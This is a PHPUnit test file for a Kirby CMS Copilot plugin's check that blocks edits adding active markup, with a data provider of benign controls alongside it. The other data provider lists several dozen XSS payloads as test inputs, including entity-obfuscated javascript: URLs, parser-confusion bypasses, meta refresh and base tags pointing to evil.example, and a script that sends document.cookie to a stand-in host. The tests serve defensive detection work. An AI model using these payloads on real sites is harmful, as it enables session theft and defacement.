<?php

declare(strict_types = 1);

use JohannSchopplich\Copilot\Agents\ActiveContent;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\PreserveGlobalState;
use PHPUnit\Framework\Attributes\RunTestsInSeparateProcesses;
use PHPUnit\Framework\Attributes\Test;

#[RunTestsInSeparateProcesses]
#[PreserveGlobalState(false)]
final class ActiveContentTest extends ApiRouteTestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        self::bootApp();
    }

    #[Test]
    #[DataProvider('newMarkup')]
    public function finds_new_active_markup(mixed $value, mixed $current = null): void
    {
        $this->assertNotNull(ActiveContent::refusal($value, $current));
    }

    public static function newMarkup(): iterable
    {
        yield 'script' => ['Hi <script>alert(1)</script>'];
        yield 'iframe' => ['<iframe src="https://evil.example"></iframe>'];
        yield 'event attribute' => ['<img src="x.jpg" onerror="alert(1)">'];
        yield 'event attribute after a slash' => ['<img/onerror=alert(1) src=x>'];
        yield 'event attribute after a quote' => ['<img src="x"onerror=alert(1)>'];
        yield 'event attribute after whitespace' => ['<img src=x onerror=alert(1)>'];
        yield 'event attribute of a link' => ['<a onclick="x">Click</a>'];
        yield 'event attribute the event list lacks' => ['<video src=x onfuturehandler=alert(1)>'];
        yield 'event attribute after a quote that closes a template attribute' => ['" autofocus onfocus="alert(1)'];
        yield 'event attribute after a quote and an encoded `>`' => ['<p>Shoe" x=&gt; onmouseover=\'alert(1)</p>'];
        yield 'event attribute after a comment in a template attribute' => ['" src=x y=<!-- onerror=alert(1) z=-->'];
        yield 'event attribute after a `>` in a quoted value' => ['<img alt=">" src=x onerror=alert(1)>'];
        yield 'event attribute in a double-quoted value left open' => ['<img src=x onerror="alert(1)'];
        yield 'event attribute in a single-quoted value left open' => ["<img src=x onerror='alert(1)"];
        yield 'changed value of an existing event attribute' => ['<img src="x.jpg" onerror="a(&quot;x&quot;)">', '<img src="x.jpg" onerror="a()">'];
        yield 'second event attribute of a tag' => ['<img onload="a()" onerror="b()">', '<img onload="a()">'];
        yield 'Markdown link' => ['[Click](javascript:alert(1))'];
        yield 'Markdown autolink' => ['<javascript://%0aalert(1)>'];
        yield 'Markdown reference definition' => ["[r]: javascript:alert(1)\n\n[Click][r]"];
        yield 'Markdown reference definition in angle brackets' => ["[r]: <javascript:alert(1)>\n\n[Click][r]"];
        yield 'numeric reference in the scheme' => ['<a href="java&#x09;script:alert(1)">Click</a>'];
        yield 'named reference for the colon' => ['<a href="javascript&colon;alert(1)">Click</a>'];
        yield 'named reference in the scheme' => ['<a href="java&Tab;script:alert(1)">Click</a>'];
        yield 'control character before the scheme' => ['<a href="&#1;javascript:alert(1)">Click</a>'];
        yield 'HTML data URL' => ['<a href="data:text/html;base64,PHNjcmlwdD4=">Click</a>'];
        yield 'markup in a blocks value' => [[['type' => 'text', 'content' => ['text' => '<p><script>alert(1)</script></p>']]]];
        yield 'second iframe next to an existing one' => [
            '<iframe src="https://evil.example"></iframe><iframe src="https://www.youtube.com/embed/x"></iframe>',
            '<iframe src="https://www.youtube.com/embed/x"></iframe>'
        ];
        yield 'second script next to an existing one' => [
            '<script src="https://platform.twitter.com/widgets.js"></script><script>fetch("//evil?" + document.cookie)</script>',
            '<script src="https://platform.twitter.com/widgets.js"></script>'
        ];
        yield 'second event attribute after a quote' => [
            '<p>Shoe" onmouseover=\'alert(1)</p><p>Boot" onmouseover=\'alert(1)</p>',
            '<p>Shoe" onmouseover=\'alert(1)</p>'
        ];
        yield 'image in a block after a block with an open comment' => [[
            ['type' => 'code', 'content' => ['code' => '<!--']],
            ['type' => 'markdown', 'content' => ['text' => '<img src=x onerror=alert(1)>']]
        ]];
        yield 'Markdown link in a block after a block with a code fence' => [[
            ['type' => 'markdown', 'content' => ['text' => '```']],
            ['type' => 'markdown', 'content' => ['text' => '[Click](javascript:alert(1))']]
        ]];
        yield 'event attribute of a tag split across two blocks' => [[
            ['type' => 'markdown', 'content' => ['text' => '<div><img src="x"']],
            ['type' => 'text', 'content' => ['text' => 'onerror=alert(1)//']]
        ]];
        yield 'image in a code block turned Markdown' => [
            [['id' => 'a', 'type' => 'markdown', 'content' => ['text' => '<img src=x onerror=alert(1)>']]],
            [['id' => 'a', 'type' => 'code', 'content' => ['code' => '<img src=x onerror=alert(1)>']]]
        ];
        yield 'script moved to another field of a block' => [
            [['type' => 'card', 'content' => ['sample' => '', 'embed' => '<script>x()</script>']]],
            [['type' => 'card', 'content' => ['sample' => '<script>x()</script>', 'embed' => '']]]
        ];
        yield 'changed body of an existing script' => ['<script>steal()</script>', '<script>track()</script>'];
        yield 'second script URL next to an existing one' => [
            '<a href="javascript:void(0)">A</a> <a href="javascript:alert(document.cookie)">B</a>',
            '<a href="javascript:void(0)">A</a>'
        ];
        yield 'code appended to an existing script URL' => ['<a href="javascript:void(0);alert(1)">A</a>', '<a href="javascript:void(0)">A</a>'];
        yield 'script URL in a srcset' => ['<img srcset="a.jpg 1x, javascript:alert(1) 2x">'];
        yield 'script URL in an SVG link' => ['<svg><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>'];
        yield 'refresh' => ['<meta http-equiv="refresh" content="0; url=https://evil.example">'];
        yield 'base URL' => ['<base href="https://evil.example/">'];
        yield 'script of 1 MB' => ['<script>' . str_repeat('a', 1_000_000) . '</script>'];
        yield 'image after a closing noscript in an attribute' => ['<noscript><p title="</noscript><img src=x onerror=alert(1)>">'];
        yield 'image after a closing textarea in an attribute' => ['<textarea><p title="</textarea><img src=x onerror=alert(1)>">'];
        yield 'image after a closing title in an attribute' => ['<title><p title="</title><img src=x onerror=alert(1)>">'];
        yield 'image after a closing xmp in an attribute' => ['<xmp><p title="</xmp><img src=x onerror=alert(1)>">'];
        yield 'image after a closing noembed in an attribute' => ['<noembed><p title="</noembed><img src=x onerror=alert(1)>">'];
        yield 'image after a comment closed with `--!>`' => ['<!-- --!><img src=x onerror=alert(1)> -->'];
        yield 'image after an empty comment' => ['<!--><img src=x onerror=alert(1)>-->'];
        yield 'image after CDATA in an SVG' => ['<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(1)>">]]></svg>'];
        yield 'image in a style in MathML' => ['<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'];
        yield 'image in a template in a select' => ['<select><template><img src=x onerror=alert(1)></template></select>'];
        yield 'code after a reference without digits in an event attribute' => ['<a onclick="a()/*&#;*/;b()">A</a>', '<a onclick="a()/*">A</a>'];
        yield 'image after an empty comment next to an existing comment' => ['<!--><img src=x onerror=alert(1)>-->Text', '<!-- c -->Text'];
        yield 'code after a reference to a surrogate in an event attribute' => ['<a onclick="a()/*&#xD800;*/;b()">A</a>', '<a onclick="a()/*">A</a>'];
    }

    #[Test]
    #[DataProvider('harmlessChanges')]
    public function lets_harmless_changes_and_existing_markup_pass(mixed $value, mixed $current = null): void
    {
        $this->assertNull(ActiveContent::refusal($value, $current));
    }

    public static function harmlessChanges(): iterable
    {
        yield 'prose with a colon after JavaScript' => ['Book: JavaScript: The Good Parts'];
        yield 'a quoted title with a colon after JavaScript' => ['Read "JavaScript: The Good Parts" first.'];
        yield 'prose in parentheses' => ['(JavaScript: closures, promises)'];
        yield 'prose in parentheses like a KirbyTag' => ['(Tip: JavaScript: closures)'];
        yield 'inline code' => ['Never write `javascript:` links.'];
        yield 'prose with a quote before a word starting with on' => ['It\'s "the best" one = two'];
        yield 'references to a tab and a line break' => ['<p title="a&#9;b&#10;c">Text</p>'];
        // Browsers read an unquoted value up to whitespace, so the backticks and `onerror` are part of `src`.
        yield 'event attribute after a backtick' => ['<img src=`x`onerror=alert(1)>'];
        // Kirby's link and image tags empty a script URL.
        yield 'KirbyTag' => ['(link: javascript:alert(1) text: Click)'];
        yield 'link of an image KirbyTag' => ['(image: a.jpg link: javascript:alert(1))'];
        yield 'image' => ['<img src="photo.jpg" alt="A lake">'];
        yield 'Markdown link' => ['[Kirby](https://getkirby.com)'];
        yield 'an existing iframe with new text around it' => [
            'Watch it: <iframe src="https://www.youtube.com/embed/x"></iframe> Enjoy.',
            '<iframe src="https://www.youtube.com/embed/x"></iframe>'
        ];
        yield 'an existing event attribute after a quote' => ['New text <img src="x.jpg" onerror="a()">', '<img src="x.jpg" onerror="a()">'];
        // Kirby gives a block sent without its id a new one.
        yield 'an existing iframe in a block sent without its id' => [
            [['type' => 'markdown', 'content' => ['text' => '<iframe src="https://www.youtube.com/embed/x"></iframe>']]],
            [['id' => 'a', 'type' => 'markdown', 'content' => ['text' => '<iframe src="https://www.youtube.com/embed/x"></iframe>']]]
        ];
        yield 'an existing script moved' => [
            "New intro\n\n<script src=\"https://platform.twitter.com/widgets.js\"></script>",
            "<script src=\"https://platform.twitter.com/widgets.js\"></script>\n\nOld intro"
        ];
    }

    #[Test]
    public function refuses_markup_it_cannot_render(): void
    {
        self::bootApp(['hooks' => ['kirbytext:after' => fn () => throw new Exception('Broken')]]);

        $this->assertSame("contains markup, which the site can't check on this server. Tell the user to edit the field in the Panel.", ActiveContent::refusal('Hello', null));
    }
}
